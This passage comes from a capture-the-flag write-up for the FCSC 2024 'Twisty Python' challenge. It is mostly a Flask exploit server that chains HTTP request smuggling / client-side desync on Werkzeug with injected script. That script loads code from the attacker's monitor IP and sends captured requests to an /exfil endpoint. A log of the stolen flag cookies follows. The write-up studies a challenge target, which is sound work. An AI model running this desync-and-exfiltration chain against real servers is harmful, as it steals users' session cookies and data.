+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response, request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode, b64decode, urlsafe_b64encode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mon_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;ip&gt;:3333&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_session</span>(payload):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://twisty-python.france-cybersecurity-challenge.fr&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># url = &#39;http://localhost:8000&#39;</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span>  requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api?action=add&#39;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: payload,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;score&#34;</span>: <span style="color:#e6db74">&#34;ez&#34;</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;set-cookie&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;session=&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;;&#39;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smuggled_self <span style="color:#f92672">=</span> b64encode(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api?action=add HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: hacker3</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-type: application/x-www-form-urlencoded</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-length: 665</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Expect: 100-Continue</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">name=me&amp;score=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>xss_html <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP/1.1 200 OK</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Tue, 09 Apr 2024 23:28:09 GMT</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: LENGTH_HERE</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;link rel=&#34;shortcut icon&#34; href=&#34;data:image/x-icon;,&#34; type=&#34;image/x-icon&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script src=&#39;http://</span><span style="color:#e6db74">{</span>mon_ip<span style="color:#e6db74">}</span><span style="color:#e6db74">/js&#39;&gt;&lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:]
+</span></span><span style="display:flex;"><span>xss_html <span style="color:#f92672">=</span> xss_html<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;LENGTH_HERE&#39;</span>, str(len(xss_html)<span style="color:#f92672">-</span>xss_html<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;&lt;!DOCTYPE html&gt;&#39;</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smuggled <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /api?action=view&amp;raw=1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: session=</span><span style="color:#e6db74">{</span>get_session(xss_html)<span style="color:#e6db74">}</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;link rel=&#34;shortcut icon&#34; href=&#34;data:image/x-icon;,&#34; type=&#34;image/x-icon&#34;&gt; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;form action=&#34;http://127.0.0.1:8000/api?action=color&amp;color=%ef%bf%bf&amp;callback=a&#34; method=&#34;POST&#34; enctype=&#39;text/plain&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;textarea name=&#34;</span><span style="color:#e6db74">{</span>smuggled<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;&lt;/textarea&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.forms[0].submit();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/js&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">js</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fetch(&#34;/api?action=clear&#34;).then(response =&gt; </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    history.pushState(null,null,&#39;/&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    fetch(&#34;/api?action=color&amp;color=%ef%bf%bf&amp;callback=&#34;+&#34;x&#34;.repeat(25), </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        method: &#34;POST&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mode: &#34;no-cors&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        credentials: &#34;include&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        keepAlive: true,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        body: atob(&#39;</span><span style="color:#e6db74">{</span>smuggled_self<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    .then(response =&gt; </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        fetch(&#34;/&#34;, </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            method: &#34;GET&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            mode: &#34;cors&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            credentials: &#34;include&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            keepAlive: true,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .then(response =&gt; </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            fetch(&#34;/api?action=view&amp;raw=1&#34;, </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                method: &#34;GET&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                mode: &#34;cors&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                credentials: &#34;include&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                keepAlive: true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            .then(response =&gt; response.text())
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            .then(text =&gt; </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                document.location=&#39;http://</span><span style="color:#e6db74">{</span>mon_ip<span style="color:#e6db74">}</span><span style="color:#e6db74">/exfil?data=&#39;.concat(btoa(text))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/exfil&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exfiltrate</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> str(b64decode(data<span style="color:#f92672">.</span>encode()))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>data<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">3333</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>Similar to the first step, I send the bot home with the <em>submit.py</em> file.</p>
+<p>After a few seconds, I receive the flags in my logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.18.224.1 - - <span style="color:#f92672">[</span>12/Apr/2024 15:24:16<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>172.18.224.1 - - <span style="color:#f92672">[</span>12/Apr/2024 15:24:16<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span><span style="color:#75715e">####################################################################################################</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#960050;background-color:#1e0010">&#39;</span>me -&gt;
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Host: 127.0.0.1:8000<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua: <span style="color:#e6db74">&#34;HeadlessChrome&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#34;</span>, <span style="color:#e6db74">&#34;Not:A-Brand&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;Chromium&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#34;</span><span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile: ?0<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> HeadlessChrome/123.0.6312.105 Safari/537.36<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform: <span style="color:#e6db74">&#34;Linux&#34;</span><span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Accept: */*<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Referer: http://127.0.0.1:8000/<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cookie: flag_medium<span style="color:#f92672">=</span>FCSC<span style="color:#f92672">{</span>ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26<span style="color:#f92672">}</span>; flag_hard<span style="color:#f92672">=</span>FCSC<span style="color:#f92672">{</span>a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e<span style="color:#f92672">}</span><span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">####################################################################################################</span>
+</span></span><span style="display:flex;"><span>172.18.224.1 - - <span style="color:#f92672">[</span>12/Apr/2024 15:24:17<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /exfil?data=bWUgLT4gCkdFVCAvIEhUVFAvMS4xDQpIb3N0OiAxMjcuMC4wLjE6ODAwMA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0Kc2VjLWNoLXVhOiAiSGVhZGxlc3NDaHJvbWUiO3Y9IjEyMyIsICJOb3Q6QS1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTIzIg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgSGVhZGxlc3NDaHJvbWUvMTIzLjAuNjMxMi4xMDUgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjgwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IGZsYWdfbWVkaXVtPUZDU0N7ZWMwZjRmMmNkNDE3ZjA3ODhlZmQ5MDk3NjdiMGMyNjkwZjExYmVkYjQxOGIyZDc3NzNlNmM5YTY1MzdjN2EyNn07IGZsYWdfaGFyZD1GQ1NDe2EyN2Q4MjA0NTA2NDQ0NDVkZGE2NzU3YjhkMDE3OTM0NTZlNjMwOGExYzA0YmViYWY1YjQzNDYyNTEyOTE1OWV9DQoNCg== HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><p>We have: <code>flag_hard=FCSC{a27d820450644445dda6757b8d01793456e6308a1c04bebaf5b434625129159e}</code></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>It was a very complicated challenge because each small modification leads to the complete shutdown of the entire exploit. Everything is measured by bytes ready in certain cases and solving the challenge requires a good understanding of the HTTP protocol as well as the Werkzeug server.</p>
+<p>Thank you <a href="https://twitter.com/kevin_mizu" target="_blank">Mizu</a> for his challenge :)</p>
+<h1 id="useful-links">Useful links:</h1>
+<ul>
+<li><a href="https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf" target="_blank">https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#capturing-other-users-requests" target="_blank">https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#capturing-other-users-requests</a></li>
+<li><a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/serving.py#L292" target="_blank">https://github.com/pallets/werkzeug/blob/main/src/werkzeug/serving.py#L292</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#abusing-http-response-queue-desynchronisation" target="_blank">https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#abusing-http-response-queue-desynchronisation</a></li>
+<li><a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1837s" target="_blank">https://www.youtube.com/watch?v=w-eJM2Pc0KI&t=1837s</a></li>
+<li><a href="https://www.youtube.com/watch?v=_A04msdplXs" target="_blank">https://www.youtube.com/watch?v=_A04msdplXs</a></li>
+</ul>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>ChatterBox | RealWorld CTF 6th</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/pong-fcsc2024-en/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Pong [EN]| FCSC 2024</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#presentations-of-the-various-actions">Presentations of the various actions.</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#first-approach-and-discovery-of-the-entry-point">First approach and discovery of the entry point.</a>
+      <ul>
+        <li><a href="#back-to-the-challenge">Back to the challenge</a></li>
+      </ul>
+    </li>
+    <li><a href="#first-exploitation">First exploitation.</a>
+      <ul>
+        <li><a href="#première-solution">Première solution:</a></li>
+        <li><a href="#second-solution">Second solution:</a></li>
+      </ul>
+    </li>
+    <li><a href="#response-creation--xss">Response creation &amp; XSS</a></li>
+    <li><a href="#second-exploitation">Second exploitation.</a>
+      <ul>
+        <li><a href="#tracks-and-reflection">Tracks and reflection.</a></li>
+        <li><a href="#technical-exploitation">Technical exploitation:</a></li>
+        <li><a href="#problems-encountered--resolutions">Problems encountered &amp; resolutions:</a></li>
+        <li><a href="#final-achievement">Final achievement:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
